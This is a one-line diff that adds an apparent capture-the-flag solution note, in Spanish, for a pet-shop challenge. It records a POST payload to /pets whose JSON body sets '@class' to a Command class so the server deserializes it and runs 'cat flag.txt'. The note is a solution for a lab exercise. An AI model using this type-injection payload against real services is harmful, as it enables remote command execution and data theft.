@@ -1,0 +1,1 @@
+POST a /pets con body {"@class":"rmartin.ctf.petshop.service.ping.Command", "command": "cat flag.txt"}%
